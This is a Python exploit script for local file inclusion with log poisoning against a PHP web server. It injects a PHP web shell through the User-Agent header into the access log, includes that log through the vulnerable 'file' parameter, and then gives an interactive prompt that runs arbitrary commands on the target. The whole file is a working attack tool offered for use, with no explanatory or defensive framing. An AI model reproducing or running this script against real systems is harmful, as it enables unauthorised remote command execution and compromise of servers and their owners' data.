#!/usr/local/bin/python3.7
import requests

##Globals
url = input('\nurl: ') #url of the vulnerable page. 
lfi_id ='file' #might be different

try:
    res = requests.get(url)
    res.raise_for_status()

except requests.exceptions.HTTPError as e:
    print(e)
    exit(1)

except:
    print('[!]Bad url..')
    print('*\turl: %s' %(url)) 
    exit(1)

if 'FreeBSD' in res.headers['Server']:
    log_page = '/var/log/httpd-access.log'
else:
    log_page = input('Log page: ')

url +='?file='+log_page
headers = {'User-Agent':"<?php system($_GET['c']); ?>"}
res = requests.get(url,headers=headers)

if 'python' in res.text.split('"')[-2]:
    print("[*] Success!! you've got shell!\n")
else:
    print("[!] Something went wrong..")
    res.close()
    exit(1)

while True:
    com = input('Shell->$: ')
    try:
        res = requests.get(url+'&c='+com,headers=headers)
    except requests.exceptions.HTTPError as e:
        print(e)
        exit(1)

    except:
        print('[!] Something went wrong..')
        exit(1)

    print(res.text.split('"')[-2].strip())

res.close()





